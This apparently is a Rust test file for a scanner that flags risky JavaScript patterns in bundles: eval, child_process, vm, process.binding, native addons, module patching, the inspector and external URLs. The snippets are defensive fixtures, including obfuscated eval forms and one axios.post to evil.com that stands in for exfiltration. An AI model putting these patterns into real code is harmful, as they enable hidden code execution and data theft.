//! SEC101–SEC108 detection tests. Split from a single combined test module
//! purely to stay under the file-size limit — see docs/code-structure.md.

use super::{is_blocked, scan_bundle};

// -----------------------------------------------------------------------
// SEC101 — eval / Function constructor
// -----------------------------------------------------------------------

#[test]
fn sec101_eval_call() {
    let findings = scan_bundle(r#"const x = eval("code");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec101_eval_with_whitespace() {
    let findings = scan_bundle(r#"x = eval ( "code" );"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_new_function_constructor() {
    let findings = scan_bundle(r#"const f = new Function("return 1");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec101_bracket_function_constructor() {
    let findings = scan_bundle(r#"const f = ["Function"]("return 1");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_globalthis_eval() {
    let findings = scan_bundle(r#"globalThis.eval("code");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_globalthis_bracket_eval() {
    let findings = scan_bundle(r#"globalThis["eval"]("code");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_window_eval() {
    let findings = scan_bundle(r#"window.eval("code");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_self_eval() {
    let findings = scan_bundle(r#"self.eval("code");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_eval_atob() {
    let findings = scan_bundle(r#"eval(atob("aGVsbG8="));"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_eval_buffer_base64() {
    let findings = scan_bundle(r#"eval(Buffer.from("aGVsbG8=", "base64"));"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC101"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec101_no_match_evaluation_variable() {
    let findings = scan_bundle(r#"const evaluation = "test";"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC101"),
        "unexpected SEC101: {findings:?}"
    );
}

#[test]
fn sec101_no_match_word_boundary() {
    let findings = scan_bundle(r#"function fooeval(x) { return x; }"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC101"),
        "unexpected SEC101: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC102 — child_process (two-pass)
// -----------------------------------------------------------------------

#[test]
fn sec102_require_child_process_with_exec() {
    let content = r#"var cp = require("child_process"); cp.exec("ls");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC102"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec102_require_node_child_process_with_spawn() {
    let content = r#"var cp = require("node:child_process"); cp.spawn("ls");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC102"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec102_esm_import_with_exec() {
    let content = r#"import { exec } from "child_process"; exec("ls");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC102"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec102_dynamic_import_with_spawn() {
    let content = r#"const cp = await import("child_process"); cp.spawn("ls");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC102"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec102_bundler_helper_with_execsync() {
    let content = r#"var cp = require_child_process(); cp.execSync("ls");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC102"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec102_fork_detected() {
    let content = r#"var cp = require("child_process"); cp.fork("worker.js");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC102"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec102_exec_without_import_no_match() {
    let findings = scan_bundle(r#"const r = exec("ls");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC102"),
        "SEC102 should not fire without import: {findings:?}"
    );
}

#[test]
fn sec102_no_signal_skips_rule() {
    let findings = scan_bundle(r#"function fork() { return 1; }"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC102"),
        "SEC102 should not fire without import signal: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC103 — vm module (two-pass)
// -----------------------------------------------------------------------

#[test]
fn sec103_require_vm_with_script() {
    let content = r#"var vm = require("vm"); new vm.Script("code");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC103"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec103_require_node_vm_with_run() {
    let content = r#"var vm = require("node:vm"); vm.runInNewContext("1+1", {});"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC103"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec103_esm_import_vm_with_run_in_this_context() {
    let content = r#"import * as vm from "vm"; vm.runInThisContext("1+1");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC103"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec103_run_in_context() {
    let content = r#"var vm = require("vm"); ctx.runInContext("code");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC103"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec103_create_context() {
    let content = r#"var vm = require("vm"); vm.createContext({});"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC103"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec103_no_signal_skips_rule() {
    let findings = scan_bundle(r#"ctx.runInNewContext("1+1", {});"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC103"),
        "SEC103 should not fire without vm import: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC104 — process.binding / dlopen (no signal required)
// -----------------------------------------------------------------------

#[test]
fn sec104_process_binding() {
    let findings = scan_bundle(r#"process.binding("fs");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC104"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec104_process_linked_binding() {
    let findings = scan_bundle(r#"process._linkedBinding("crypto");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC104"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec104_process_dlopen() {
    let findings = scan_bundle(r#"process.dlopen(module, "binding.node");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC104"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec104_internal_binding() {
    let findings = scan_bundle(r#"const b = internalBinding("crypto");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC104"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec104_bracket_binding() {
    let findings = scan_bundle(r#"process["binding"]("fs");"#, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC104"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec104_no_match_process_env() {
    let findings = scan_bundle(r#"const val = process.env.KEY;"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC104"),
        "unexpected SEC104: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC105 — native addons (two-pass)
// -----------------------------------------------------------------------

#[test]
fn sec105_require_bindings_with_dot_node() {
    let content = r#"var b = require("bindings"); b("native.node");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC105"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec105_require_ffi_napi_with_dot_node() {
    let content = r#"var ffi = require("ffi-napi"); ffi.Library("lib.node");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC105"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec105_import_bindings_with_dot_node() {
    let content = r#"import bindings from "bindings"; const x = bindings("mod.node");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC105"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec105_no_signal_skips_rule() {
    let findings = scan_bundle(r#"require("./addon.node");"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC105"),
        "SEC105 should not fire without signal: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC106 — module monkey-patching (two-pass)
// -----------------------------------------------------------------------

#[test]
fn sec106_require_module_with_load_override() {
    let content = r#"var Module = require("module"); Module._load = function() {};"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC106"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec106_import_module_with_resolve_override() {
    let content = r#"import Module from "module"; Module._resolveFilename = function() {};"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC106"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec106_require_cache_assignment() {
    let content = r#"var Module = require("module"); require.cache["key"] = null;"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC106"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec106_delete_require_cache() {
    let content = r#"var Module = require("module"); delete require.cache;"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC106"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec106_bracket_load_override() {
    let content = r#"var M = require("module"); Module["_load"] = function() {};"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC106"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec106_no_signal_skips_rule() {
    let findings = scan_bundle(r#"Module._load = function() {};"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC106"),
        "SEC106 should not fire without module import: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC107 — inspector module (two-pass)
// -----------------------------------------------------------------------

#[test]
fn sec107_require_inspector_with_open() {
    let content = r#"var inspector = require("inspector"); inspector.open(9229);"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC107"),
        "findings: {findings:?}"
    );
    assert!(is_blocked(&findings));
}

#[test]
fn sec107_require_node_inspector_with_wait() {
    let content = r#"var inspector = require("node:inspector"); inspector.waitForDebugger();"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC107"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec107_esm_import_inspector_with_open() {
    let content = r#"import inspector from "inspector"; inspector.open();"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC107"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec107_inspector_url() {
    let content = r#"var inspector = require("inspector"); console.log(inspector.url());"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC107"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec107_bracket_open() {
    let content = r#"var inspector = require("inspector"); inspector["open"](9229);"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC107"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec107_no_signal_skips_rule() {
    let findings = scan_bundle(r#"inspector.open(9229);"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC107"),
        "SEC107 should not fire without import: {findings:?}"
    );
}

// -----------------------------------------------------------------------
// SEC108 — external URLs (two-pass, warn)
// -----------------------------------------------------------------------

#[test]
fn sec108_require_https_with_url() {
    // Use a trusted godaddy.com domain so SEC112 (block) does not also fire.
    let content = r#"var https = require("https"); https.get("https://api.godaddy.com/v1/");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC108"),
        "findings: {findings:?}"
    );
    assert!(!is_blocked(&findings), "SEC108 should be warn, not block");
}

#[test]
fn sec108_import_axios_with_url() {
    let content = r#"import axios from "axios"; axios.post("https://evil.com/data", {});"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC108"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec108_fetch_with_https_url() {
    let content = r#"import { request } from "https"; fetch("https://api.example.com");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC108"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec108_http_url() {
    let content = r#"var http = require("http"); http.get("http://example.com");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC108"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec108_new_url_constructor() {
    let content = r#"var http = require("http"); const u = new URL("https://api.example.com");"#;
    let findings = scan_bundle(content, "test.mjs");
    assert!(
        findings.iter().any(|f| f.rule_id == "SEC108"),
        "findings: {findings:?}"
    );
}

#[test]
fn sec108_no_signal_skips_rule() {
    let findings = scan_bundle(r#"const url = "https://api.example.com";"#, "test.mjs");
    assert!(
        findings.iter().all(|f| f.rule_id != "SEC108"),
        "SEC108 should not fire without http/axios import: {findings:?}"
    );
}
